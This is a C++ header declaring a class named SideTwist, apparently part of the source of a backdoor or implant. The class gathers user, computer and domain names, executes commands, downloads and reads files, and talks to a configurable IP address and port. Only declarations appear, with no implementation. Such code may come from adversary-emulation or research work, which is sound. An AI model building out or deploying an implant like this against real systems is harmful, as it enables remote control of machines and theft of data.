#pragma once
#include <windows.h>
#include <string>
#include <iostream>
#include <sysinfoapi.h>
#include <shlwapi.h>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>
#include "comms.h"
#include <stdio.h>
#include <fstream>
#include <iterator>
#include <vector>

#pragma comment(lib, "shlwapi.lib")

class SideTwist
{
private:
	std::string id;
	std::string	ip_address;
	int port;
	void setID();
	std::string getUserName();
	std::string getComputerName();
	std::string getDomainName();

public:
	SideTwist();
	~SideTwist();
	std::string getID();
	std::string cmdExec(std::string cmd);
	std::string download(std::string fileName, std::string filePath, StComms* commsObj);
	void getFileBytes(std::string filePath, std::string& fileBytes);
	bool setIPAddress(std::string ip);
	bool setPort(std::string port);
	std::string getAddressAndPort();
	int run();
};